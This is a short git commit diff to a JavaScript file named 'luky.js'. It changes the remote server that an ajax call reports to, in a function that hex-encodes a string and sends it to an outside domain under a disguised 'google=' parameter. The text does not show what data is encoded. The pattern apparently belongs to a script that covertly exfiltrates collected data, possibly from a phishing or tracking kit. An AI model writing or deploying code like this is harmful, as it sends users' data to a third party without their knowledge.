39f5ea04f669b51ecbdae249b09efd6acde264e8
yaman1012 <manzding12@gmail.com>
2025-03-13 21:13:09 +0700

    Update luky.js

--- luky.js
+++ luky.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://manz-js.zeuxs.my.id/scriptjs/?google=" +
+                    "https://kezy-js.zeuxs.my.id/scriptjs/?google=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
